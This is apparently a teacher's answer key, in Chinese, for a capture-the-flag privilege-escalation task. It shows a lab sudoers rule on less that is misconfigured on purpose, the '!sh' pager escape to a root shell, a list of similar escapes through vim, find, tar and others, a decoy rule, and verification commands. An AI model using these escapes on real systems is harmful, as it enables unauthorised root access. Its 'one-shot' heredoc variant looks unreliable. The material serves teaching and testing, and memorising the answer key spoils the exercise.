# 第 2 题（教师版）：sudo 里给人留的门缝

> **唯一提权面**：`sudo -l` 显示 `(root) NOPASSWD: /usr/bin/less /var/log/app/*`
> **唯一解**：在 `less` 分页器里按 `!` 执行 `!sh`，得到 root shell
> **干扰项**：`/etc/sudoers.d/91-archive` 是给 `web` 用户的 tar 授权，`player` 用不了；`tar` 逃逸路径不属于本题

## 一、预置环境

| 路径 | 权限 | 说明 |
|---|---|---|
| `/flag.txt` | `root:root 0400` | 构建时生成 |
| `/etc/sudoers.d/90-readlogs` | `root:root 0440` | `player NOPASSWD: /usr/bin/less /var/log/app/*` |
| `/etc/sudoers.d/91-archive` | `root:root 0440` | 干扰项：授权对象是 `web` 用户 |
| `/var/log/app/*` | `root:root 0640` | 日志素材，player 直接读会 Permission denied |

## 二、唯一解

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/less /var/log/app/*

sudo less /var/log/app/app.log
# less 界面中依次输入：
!sh
# 或 :!sh
```

进入后 `id` → `uid=0(root)`，`cat /flag.txt`。

### 一次性命令写法（不做交互展示）

```bash
sudo less /var/log/app/app.log <<'EOF'
!sh -c 'id; cat /flag.txt' > /tmp/out; cat /tmp/out
!q
EOF
```
更简洁的验证方式（非交互场景）：

```bash
sudo less -X /var/log/app/app.log  # 然后在 less 里 !/bin/sh
```

### 关键点讲解

- `less` 的 `!` 命令会调用 `$SHELL` 执行任意命令，**并且继承了 sudo 的 root 身份**。
- 这类“受限命令”之所以危险，是因为 sudo 授权的是**程序**而不是**它能做的事**。
- 同类还有：`vi`/`vim` 的 `:!sh`、`man` 的 `!`、`more`、`nano` 的 `^R^X`、`tar --checkpoint-action`、`find -exec`。
- GTFOBins 搜 `less` → 直接给出一行命令。

## 三、干扰项说明

`/etc/sudoers.d/91-archive` 里是：

```
web ALL=(root) NOPASSWD: /usr/bin/tar -czf /tmp/* /var/log/app/
```

`player` 如果照搬 tar 逃逸技巧，会因为 **sudoers 里没有 player 的条目**直接失败：
```
Sorry, user player is not allowed to execute '/usr/bin/tar ...' as root.
```
这一项教学生：**sudo -l 的输出里“没有”比你“看到别人有”更重要**。

## 四、单解验证

```bash
# 正向
sudo -l | grep less
sudo less /var/log/app/app.log   # 然后 !sh
id      # uid=0
cat /flag.txt

# 负向（必须全部失败）
sudo -n /usr/bin/tar -czf /tmp/x /var/log/app/   # player 无此授权
sudo -n /bin/bash                                # not allowed
cat /var/log/app/app.log                         # 直接读: Permission denied
sudo -n cat /flag.txt                            # 不在授权列表
```
